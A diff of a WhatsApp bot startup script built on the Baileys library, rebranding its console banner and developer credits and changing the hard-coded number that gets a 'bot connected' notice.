@@ -34,7 +34,7 @@ async function startSesi() {
 const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
 const { state, saveCreds } = await useMultiFileAuthState(`./session`)
 const { version, isLatest } = await fetchLatestBaileysVersion()
-    console.log(chalk.red.bold('╭━━━━┳╮╱╱╭┳━╮╱╭╮\n╰━━╮━┃╰╮╭╯┃┃╰╮┃┃\n╱╱╭╯╭┻╮╰╯╭┫╭╮╰╯┃\n╱╭╯╭╯╱╰╮╭╯┃┃╰╮┃┃\n╭╯━╰━╮╱┃┃╱┃┃╱┃┃┃\n╰━━━━╯╱╰╯╱╰╯╱╰━╯\n╭━━━━┳━━━━┳╮╱╱╭╮\n┃╭╮╭╮┣━━╮━┃╰╮╭╯┃\n╰╯┃┃╰╯╱╭╯╭┻╮╰╯╭╯\n╱╱┃┃╱╱╭╯╭╯╱╰╮╭╯╱\n╱╱┃┃╱╭╯━╰━╮╱┃┃╱╱\n╱╱╰╯╱╰━━━━╯╱╰╯╱╱\n\nZyn Tzy Version 12.0.0\n\nCreated By : Zynxzo Developer\nTelegram : @zynnnxzzzo\nSubscribe Youtube : @zynxzoo'))
+    console.log(chalk.red.bold('╭━━━━┳╮╱╱╭┳━╮╱╭╮\n╰━━╮━┃╰╮╭╯┃┃╰╮┃┃\n╱╱╭╯╭┻╮╰╯╭┫╭╮╰╯┃\n╱╭╯╭╯╱╰╮╭╯┃┃╰╮┃┃\n╭╯━╰━╮╱┃┃╱┃┃╱┃┃┃\n╰━━━━╯╱╰╯╱╰╯╱╰━╯\n╭━━━━┳━━━━┳╮╱╱╭╮\n┃╭╮╭╮┣━━╮━┃╰╮╭╯┃\n╰╯┃┃╰╯╱╭╯╭┻╮╰╯╭╯\n╱╱┃┃╱╱╭╯╭╯╱╰╮╭╯╱\n╱╱┃┃╱╭╯━╰━╮╱┃┃╱╱\n╱╱╰╯╱╰━━━━╯╱╰╯╱╱\n\nRe--Jeong Version 4.0.0\n\nCreated By : Re-Jeong Developer\nTelegram : @guanxiirejeong\nSubscribe Youtube : @Re-Jeong'))
 const connectionOptions = {
 version,
 keepAliveIntervalMs: 30000,
@@ -86,7 +86,7 @@ startSesi()
 start(`1`, `Connecting...`)
 } else if (connection === "open") {
 success(`1`, `Tersambung`)
-zyn.sendMessage(`6285789034010@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
+zyn.sendMessage(`27623649420@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
   Bot Succes Connecting`})
 if (autoJoin) {
 zyn.groupAcceptInvite(codeInvite)
